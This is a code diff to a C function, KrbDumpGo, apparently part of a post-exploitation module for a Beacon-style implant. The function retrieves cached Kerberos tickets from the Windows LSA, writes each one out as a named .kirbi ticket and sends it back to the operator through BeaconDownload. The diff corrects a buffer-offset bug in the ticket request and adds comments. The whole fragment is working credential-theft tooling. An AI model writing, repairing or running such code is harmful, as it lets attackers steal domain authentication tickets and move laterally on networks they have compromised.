@@ -95,10 +95,10 @@ VOID KrbDumpGo( _In_ PVOID Argv, _In_ INT Argc )
 									/* Allocate the retrieve ticket request */
 									if ( ( Krt = Api.RtlAllocateHeap( NtCurrentPeb()->ProcessHeap, HEAP_ZERO_MEMORY, sizeof( KERB_RETRIEVE_TKT_REQUEST ) + Res->Tickets[ Idx ].ServerName.MaximumLength ) ) != NULL ) {
 										/* Set request information */
-										Krt->MessageType  = KerbRetrieveEncodedTicketMessage;
-										Krt->CacheOptions = KERB_RETRIEVE_TICKET_AS_KERB_CRED;
-										Krt->TicketFlags  = Res->Tickets[ Idx ].TicketFlags;
-										Krt->TargetName.Buffer = C_PTR( U_PTR( Krt ) + Res->Tickets[ Idx ].ServerName.MaximumLength );
+										Krt->MessageType       = KerbRetrieveEncodedTicketMessage;
+										Krt->CacheOptions      = KERB_RETRIEVE_TICKET_AS_KERB_CRED;
+										Krt->TicketFlags       = Res->Tickets[ Idx ].TicketFlags;
+										Krt->TargetName.Buffer = C_PTR( U_PTR( Krt ) + sizeof( KERB_RETRIEVE_TKT_REQUEST ) );
 										Krt->TargetName.Length = Res->Tickets[ Idx ].ServerName.Length;
 										Krt->TargetName.MaximumLength = Res->Tickets[ Idx ].ServerName.MaximumLength;
 										__builtin_memcpy( Krt->TargetName.Buffer, Res->Tickets[ Idx ].ServerName.Buffer, Res->Tickets[ Idx ].ServerName.MaximumLength );
@@ -106,7 +106,9 @@ VOID KrbDumpGo( _In_ PVOID Argv, _In_ INT Argc )
 										/* Request the ticket! */
 										if ( NT_SUCCESS( Api.LsaCallAuthenticationPackage( Lsa, Kid, Krt, sizeof( KERB_RETRIEVE_TKT_REQUEST ) + Res->Tickets[ Idx ].ServerName.MaximumLength, &Krr, &RLn, &Pst ) ) ) {
 											if ( NT_SUCCESS( Pst ) ) {
+												/* Create string buffer! */
 												if ( ( Out = BufferCreate() ) != NULL ) {
+													/* Create output filename */
 													if ( BufferPrintf( Out, 
 															   "%u-%08x-%wZ@%wZ-%wZ.kirbi\0", 
 															   Idx, 
@@ -116,12 +118,15 @@ VOID KrbDumpGo( _In_ PVOID Argv, _In_ INT Argc )
 															   Res->Tickets[ Idx ].ServerRealm 
 													) ) 
 													{
+														/* Download the ticket! */
 														BeaconDownload( Krr->Ticket.EncodedTicket, Krr->Ticket.EncodedTicketSize, Out->Buffer );
 													};
+													/* Free the buffer! */
 													Api.RtlFreeHeap( NtCurrentPeb()->ProcessHeap, 0, Out->Buffer );
 													Api.RtlFreeHeap( NtCurrentPeb()->ProcessHeap, 0, Out );
 												};
 											};
+											/* Free the buffer! */
 											Api.LsaFreeReturnBuffer( Krr );
 										};
 
